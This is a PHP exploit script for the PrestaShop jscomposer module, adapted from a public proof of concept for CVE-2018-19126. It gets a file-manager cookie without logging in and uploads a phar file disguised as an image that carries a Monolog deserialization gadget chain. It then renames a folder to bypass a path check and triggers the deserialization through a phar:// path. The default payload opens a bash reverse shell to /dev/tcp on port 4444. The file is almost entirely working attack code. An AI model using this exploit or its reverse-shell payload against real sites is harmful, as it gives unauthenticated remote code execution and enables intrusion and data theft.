<?php
/**
 * 
 * Exploit phar unserialize on jscomposer (just like CVE-2018-19126 but from front end and unauthenticated)
 * Seems to be fixed (unauthenticated at least) in the 4.4.18 version (november 2020)
 * This Script is a modification of from https://github.com/farisv/PrestaShop-CVE-2018-19126 to match the visualcomposer plugin path
 * 
 * Tested locally succefully on version 4.4.4 of visualcomposer
 * find your visualcomposer prestashop version : /modules/jscomposer/config.xml
 */

namespace PrestaShopRCE {

    class Exploit {
        private $url;
        private $func;
        private $param;

        public function __construct($url, $func, $param) {
            $this->url = $url;
            $this->func = $func;
            $this->param = $param;
        }

        private function post($path, $data, $cookie) {
            $curl_handle = curl_init();
            $proxy_host = '127.0.0.1:8080';  
            $options = array(
                CURLOPT_URL => $this->url . $path,
                CURLOPT_HEADER => true,
                CURLOPT_POST => 1,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPPROXYTUNNEL => true,
                CURLOPT_PROXY => $proxy_host,
                CURLOPT_COOKIE => $cookie,
                CURLOPT_SSL_VERIFYPEER => false
            );
            
            curl_setopt_array($curl_handle, $options);
            $raw = curl_exec($curl_handle);
            curl_close($curl_handle);

            return $raw;
        }

        private function fetch_cookie($raw) {
            $header = "Set-Cookie: ";
            $cookie_header_start = strpos($raw, $header);
            $sliced_part = substr($raw, $cookie_header_start + strlen($header));
            $cookie = substr($sliced_part, 0, strpos($sliced_part, ';'));
            return $cookie;
        }

        public function run() {

            // Get FileManager cookie
            $data = array();
            $raw = $this->post('/modules/jscomposer/views/dialog.php', $data, '');
            $cookie = $this->fetch_cookie($raw);
           // Craft deserialization gadget
            $gadget = new \Monolog\Handler\SyslogUdpHandler(
                new \Monolog\Handler\BufferHandler(
                    ['current', $this->func],
                    [$this->param, 'level' => null]
                )
            );
            // Craft malicious phar file
            $phar = new \Phar('phar.phar');
            $phar->startBuffering();
            $phar->addFromString('test', 'test');
            $phar->setStub('GIF89<?php __HALT_COMPILER(); ? >');
            $phar->setMetadata($gadget);
            $phar->stopBuffering();

            // Change the extension
            rename('phar.phar', 'phar.png');

            // Upload phar.pdf
            $curl_file = new \CurlFile('phar.png', 'image/png', 'phar.png');
            $data = array(
                'path' => '/',
                'path_thumb' => '/',
                'file' => $curl_file
            );
            $raw = $this->post('/modules/jscomposer/views/upload.php', $data, $cookie);

            $renamed = 'renamed'.rand();
            echo 'renamed folder:'.$renamed."\n";

            // Rename image directory to bypass realpath() check
            $data = array(
                'name' => $renamed
            );
            $raw = $this->post(
                '/modules/jscomposer/views/execute.php?action=rename_folder',
                $data,
                $cookie
            );
            // Trigger deserialization
            // The '/modules/jscomposer/uploads/' substring is important to bypass string check
            $data = array(
                'path' => 'phar://../'.$renamed.'/phar.png/modules/jscomposer/uploads/'
            );
            $raw = $this->post(
                '/modules/jscomposer/views/ajax_calls.php?action=image_size',
                $data,
                $cookie
            );

            // Display the raw result
	    print $raw;
        }
    }

}

/*
 * Based on
 * https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/
*/
namespace Monolog\Handler {

    class SyslogUdpHandler {
        protected $socket;

        function __construct($param) {
            $this->socket = $param;
        }
    }

    class BufferHandler {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        protected $level = null;
        protected $initialized = true;
        protected $bufferLimit = -1;
        protected $processors;

        function __construct($methods, $command) {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = clone $this;
        }
    }

}

namespace {

    if (!extension_loaded('curl')) {
        die('Need php-curl');
    }

    $url = "https://vulnerable-website/";
    $func = "system";
    $param = "bash -c 'bash -i >& /dev/tcp/x.x.x.x/4444 0>&1'";

    $exploit = new PrestaShopRCE\Exploit($url, $func, $param);
    $exploit->run();

}
